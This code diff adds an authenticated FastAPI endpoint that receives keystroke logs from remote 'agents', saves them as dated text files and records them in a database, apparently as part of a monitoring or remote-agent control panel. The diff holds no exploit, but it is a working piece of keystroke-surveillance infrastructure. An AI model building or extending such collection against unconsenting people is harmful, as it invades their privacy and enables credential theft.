@@ -12,6 +12,7 @@ import os, json, uuid
 from fastapi.staticfiles import StaticFiles
 from sqlalchemy import select, delete
 from models import EventFile
+from datetime import datetime
 
 # Load environment variables from .env
 load_dotenv()
@@ -278,6 +279,30 @@ async def history_list(kind: str | None = None, agent_id: str | None = None, lim
                 "note": r.note,
             } for r in rows
         ]})
+
+@app.post('/admin/history/keylog')
+async def history_add_keylog(body: dict, _: bool = Depends(auth_required)):
+    try:
+        agent_id = str((body or {}).get('agent_id') or '')
+        agent_name = (body or {}).get('agent_name') or agent_id
+        text = (body or {}).get('text') or ''
+        if not agent_id or not text:
+            return JSONResponse(status_code=400, content={"error": "missing agent_id or text"})
+        # Save file
+        subdir = os.path.join(MEDIA_ROOT, 'keylog', datetime.utcnow().strftime('%Y%m'))
+        os.makedirs(subdir, exist_ok=True)
+        fname = f"{uuid.uuid4().hex}.txt"
+        path = os.path.join(subdir, fname)
+        with open(path, 'w', encoding='utf-8') as f:
+            f.write(str(text))
+        rel = os.path.relpath(path, MEDIA_ROOT).replace('\\','/')
+        storage_url = f"/media/{rel}"
+        async with await get_session() as s:
+            rec = EventFile(id=uuid.uuid4(), ts=datetime.utcnow(), agent_id=agent_id, kind='keylog', storage_url=storage_url, size_bytes=os.path.getsize(path), width=None, height=None, note=agent_name)
+            s.add(rec); await s.commit()
+        return JSONResponse(content={"ok": True, "storage_url": storage_url})
+    except Exception as e:
+        return JSONResponse(status_code=500, content={"error": str(e)})
 
 @app.delete('/admin/history/{item_id}')
 async def history_delete(item_id: str, _: bool = Depends(auth_required)):
